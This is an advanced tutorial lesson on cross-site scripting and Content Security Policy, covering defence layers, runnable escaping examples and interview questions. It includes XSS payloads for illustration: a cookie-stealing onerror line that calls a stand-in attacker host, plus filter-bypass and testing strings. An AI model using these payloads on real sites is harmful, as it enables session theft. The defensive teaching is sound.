---
title: Cross-site scripting (XSS) and Content Security Policy
level: advanced
time: 40
summary: The three kinds of XSS (stored, reflected, DOM-based), what an attacker can do, the defence layers (output encoding, safe DOM APIs, framework escaping, sanitising, CSP, HttpOnly cookies, Trusted Types) and runnable examples of escaping and sanitising.
---

## What is XSS?

> "**Cross-site scripting (XSS)** happens when an attacker gets **their JavaScript to run on your page**, in your visitors' browsers, with **your site's privileges**."

Once their script runs inside your origin, the same-origin policy is **on their side**: they can read the page, **steal data and tokens in `localStorage`**, make requests as the user (with cookies attached), change what the user sees (fake login forms), log keystrokes, and spread themselves (worms).

| Type | How the payload arrives | Example |
|---|---|---|
| **Stored XSS** (persistent) | saved on the server (a comment, profile name) and shown to **every** visitor | `<script>` in a forum post |
| **Reflected XSS** | part of the **request** (a URL parameter) is echoed into the response | `/search?q=<script>…</script>` in a phished link |
| **DOM-based XSS** | **client-side code** writes untrusted data into the DOM (`innerHTML`, `document.write`, `eval`) | `el.innerHTML = location.hash.slice(1)` |

```js run title="The root cause: untrusted text becomes markup (a server-side template mistake)"
const comment = `Nice post! <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`;

// VULNERABLE: string concatenation builds HTML
const unsafeHtml = `<div class="comment"><p>${comment}</p></div>`;
console.log(unsafeHtml);
// the browser will parse that <img>, the image fails to load, and onerror runs the attacker's code

// SAFE: encode special characters for the HTML context
const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const safeHtml = `<div class="comment"><p>${escapeHtml(comment)}</p></div>`;
console.log(safeHtml);
```

## Defence in depth

No single measure is enough. Use several layers.

### 1. Never build HTML from untrusted data: use safe APIs

| Unsafe (parses HTML / runs code) | Safe |
|---|---|
| `el.innerHTML = userData` | `el.textContent = userData` |
| `el.insertAdjacentHTML(...)`, `document.write`, `outerHTML` | `createElement` + `textContent` + `append` |
| `eval(userData)`, `new Function(userData)`, `setTimeout("string")` | never; use data (JSON) and functions |
| `<a href={userUrl}>` with `javascript:` URLs | validate the URL scheme (`https:`/`http:` only) |
| `el.setAttribute("onclick", userData)`, `el.src = userUrl` for scripts | set properties on elements you create; never event-handler attributes |
| Frameworks: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{@html}` | the default template syntax (it escapes) |

```js run title="URL context: javascript: links are XSS too"
const isSafeUrl = (value) => {
  try {
    const url = new URL(value, "https://app.example.com");        // resolves relative URLs against the base
    return ["http:", "https:", "mailto:"].includes(url.protocol);
  } catch { return false; }
};

for (const href of ["https://example.com/profile", "/relative/path", "javascript:alert(document.cookie)", "JaVaScRiPt:alert(1)", "data:text/html,<script>alert(1)</script>"]) {
  console.log(String(isSafeUrl(href)).padEnd(6), href);
}
```

### 2. Encode output for the right context

Different places need different encoding:

| Context | Example | What to do |
|---|---|---|
| HTML body | `<p>${x}</p>` | HTML-escape `& < > " '` |
| HTML attribute | `<input value="${x}">` | HTML-escape **and always quote** attributes |
| JavaScript string | `<script>var a = "${x}"</script>` | avoid: pass data as JSON in a `data-` attribute or a `<script type="application/json">` block |
| URL | `href="/search?q=${x}"` | `encodeURIComponent(x)` |
| CSS | `style="color:${x}"` | avoid; allow-list values |

Template engines and frameworks escape for the **HTML body** by default (React, Vue, Angular, Handlebars `{{ }}`, EJS `<%= %>`, Pug `#{}`). The danger is the **opt-outs** (`<%- %>`, `{{{ }}}`, `v-html`) and the **non-HTML contexts**.

### 3. Sanitise when you must allow some HTML

If users may write rich text (a blog editor), **sanitise** with a **well-maintained library**, never your own regex:

```js
import DOMPurify from "dompurify";
const clean = DOMPurify.sanitize(dirtyHtml, { USE_PROFILES: { html: true } });   // removes scripts, event handlers, javascript: URLs
element.innerHTML = clean;

// Sanitizer API (newer browsers): element.setHTML(dirtyHtml) sanitises as it inserts
```

**Allow-list** tags and attributes (b, i, a[href], ul, li...). Sanitise on **output** (or at both input and output); keep the library **updated** (bypasses are found regularly).

```js run title="Why a regex 'sanitiser' fails"
const naiveSanitize = (html) => html.replace(/<script.*?>.*?<\/script>/gi, "");        // looks reasonable...

const attacks = [
  "<script>alert(1)</script>",                    // blocked
  "<img src=x onerror=alert(1)>",                 // not a <script> tag: passes!
  "<scr<script>ipt>alert(1)</scr</script>ipt>",   // nesting trick: leaves a working <script> after removal
  "<svg onload=alert(1)>",
  "<a href=\"javascript:alert(1)\">click</a>",
];
for (const a of attacks) console.log(naiveSanitize(a) === a ? "UNCHANGED " : "changed   ", naiveSanitize(a));
```

### 4. Content Security Policy (CSP): the strongest safety net

CSP is an HTTP **response header** that tells the browser **which sources of scripts, styles, images and connections are allowed**. Even if an attacker injects markup, the browser **refuses to run** inline or foreign scripts.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m123' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'none';
  object-src 'none';
  upgrade-insecure-requests
```

| Directive | Controls |
|---|---|
| `default-src` | the fallback for other fetch directives |
| `script-src` | where JavaScript may come from (**the important one**) |
| `style-src`, `img-src`, `font-src`, `media-src` | other resources |
| `connect-src` | `fetch`, XHR, WebSocket destinations |
| `frame-src` / **`frame-ancestors`** | what you can embed / who can embed **you** (clickjacking) |
| `base-uri`, `form-action`, `object-src` | block `<base>` hijacking, form posts to other sites, plugins |
| `report-uri` / `report-to` | send violation reports |

Key ideas:

- **Avoid `'unsafe-inline'` and `'unsafe-eval'` in `script-src`.** They remove most of the protection.
- Use **nonces** (a random value per response, added as `<script nonce="...">`) or **hashes** to allow specific inline scripts. `'strict-dynamic'` trusts scripts loaded by trusted scripts.
- Roll out with **`Content-Security-Policy-Report-Only`** first, read the reports, then enforce.

```js run node title="Generating a CSP header with a per-response nonce"
const crypto = require("node:crypto");

function cspFor(response) {
  const nonce = crypto.randomBytes(16).toString("base64");                  // new for EVERY response
  response.locals = { nonce };
  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    "object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'",
  ].join("; ");
}

const res = {};
const header = cspFor(res);
console.log(header.includes(`'nonce-${res.locals.nonce}'`), header.split("; ").length, "directives");
console.log('<script nonce="(the random value)">  runs;   <script>injected()</script>  is blocked (no nonce)');
```

### 5. Limit the damage

- **`HttpOnly` cookies** for sessions: XSS cannot read them. (It can still make requests as the user, so reduce what a single session can do.)
- **Do not store tokens in `localStorage`.**
- **Trusted Types** (Chrome): `Content-Security-Policy: require-trusted-types-for 'script'` makes dangerous sinks (`innerHTML`) accept only values created by an approved policy (a sanitiser). Great against DOM XSS.
- **Subresource Integrity (SRI)** for third-party scripts: `<script src="cdn/lib.js" integrity="sha384-…" crossorigin>`.
- Minimise **third-party scripts**: each one is full access to your page.
- **Re-authentication** for sensitive actions (change password, payments).

## XSS in React and other frameworks

React escapes everything you put in `{}`. XSS appears through:

```jsx
<div dangerouslySetInnerHTML={{ __html: userComment }} />   // opt-out: sanitise first!
<a href={userUrl}>link</a>                                   // javascript: URL: validate the scheme
<iframe src={userUrl} />, ref.current.innerHTML = x           // direct DOM access
useEffect(() => { eval(userCode); });                         // never
```

and in **server-side rendering** when you inject JSON into HTML: `JSON.stringify(state)` inside a `<script>` is **not safe** (`</script>` in a string ends the tag). Use `serialize-javascript` or escape `<`:

```js run title="Embedding JSON in a <script> safely"
const state = { name: "Asha", bio: "</script><script>alert('XSS')</script>" };

const unsafe = `<script>window.__STATE__ = ${JSON.stringify(state)}</script>`;
const safe = `<script>window.__STATE__ = ${JSON.stringify(state).replace(/</g, "\\u003c")}</script>`;

console.log(unsafe.includes("</script><script>"));      // true: the attacker's script tag appears
console.log(safe.includes("</script><script>"), safe.includes("\\u003c"));   // false true: < is written as \u003c, still valid JSON
```

## Testing for XSS

- Try payloads in every input and URL parameter: `"><img src=x onerror=alert(1)>`, `'-alert(1)-'`, `javascript:alert(1)`.
- Use scanners (OWASP ZAP, Burp), and lint rules (`eslint-plugin-security`, `react/no-danger`).
- Enable and monitor **CSP reports**.

:::interview What is XSS? How do you prevent it?
"XSS is when an attacker gets their script to run in other users' browsers on my origin, either stored on the server, reflected from the request, or DOM-based through unsafe client-side sinks like innerHTML. The script can steal non-HttpOnly cookies and tokens, make authenticated requests and change the page. I defend in layers: never build HTML from untrusted strings, so use textContent and framework escaping and avoid dangerouslySetInnerHTML and v-html; encode output for its context; sanitise any user-supplied HTML with DOMPurify using an allow-list; validate URL schemes; set a strict Content Security Policy with nonces and no unsafe-inline; keep session cookies HttpOnly and never keep tokens in localStorage; use Trusted Types and SRI; and minimise third-party scripts."
:::

## More interview questions on this topic

:::qa What is the difference between stored, reflected and DOM-based XSS? {level=easy}
**Say this:** "Stored: the payload is saved on the server and served to everyone. Reflected: it comes from the current request and is echoed back (usually via a crafted link). DOM-based: client-side JavaScript puts untrusted data into a dangerous sink, so the server may never see it."

**In simple words:** Saved, bounced back, or created in the browser.
:::

:::qa Does React protect you from XSS? {level=medium}
**Say this:** "Largely, because JSX escapes values. But `dangerouslySetInnerHTML`, `javascript:` URLs in `href`, direct DOM manipulation, SSR state injection and third-party libraries can still introduce XSS."

**In simple words:** The default is safe; the escape hatches are not.
:::

:::qa How does CSP help if an attacker already injected a script tag? {level=medium}
**Say this:** "With `script-src 'self' 'nonce-…'`, the browser runs only scripts from allowed origins or with the correct per-response nonce, so an injected inline script has no nonce and is blocked, and event-handler attributes are blocked as well."

**In simple words:** The browser only runs scripts with the secret stamp.
:::

:::qa Why is output encoding context-dependent? {level=medium}
**Say this:** "Characters that are dangerous differ by context: `<` in HTML body, quotes in attributes, `</script>` and quotes in JavaScript, and `javascript:` in URLs. Using the wrong encoder leaves a hole."

**In simple words:** Each place has its own special characters.
:::

```quiz
? Which is safe for inserting a user's name into the page?
- el.innerHTML = name
+ el.textContent = name
- document.write(name)
> textContent does not parse markup.
? What makes a CSP weak?
- default-src 'self'
+ script-src with 'unsafe-inline'
- object-src 'none'
> It allows injected inline scripts.
? What does HttpOnly do for XSS?
- Prevents XSS entirely
+ Stops scripts from reading the cookie (limits damage)
- Encrypts the cookie
> The script can still make requests as the user.
```

:::keypoints
- **XSS** = attacker script runs on your origin: **stored, reflected, DOM-based**. Impact: stolen data/tokens, actions as the user, defacement.
- **Prevent**: safe APIs (`textContent`), **context-aware output encoding**, framework escaping (avoid `dangerouslySetInnerHTML`/`v-html`), validate URL schemes, **sanitise** rich text with **DOMPurify** (not regex).
- **CSP** with nonces/hashes, no `unsafe-inline`/`unsafe-eval`; report-only first. **Trusted Types**, **SRI**, fewer third-party scripts.
- Limit damage: **HttpOnly** cookies, no tokens in localStorage, re-auth for sensitive actions. Escape `<` when embedding JSON in HTML.
:::
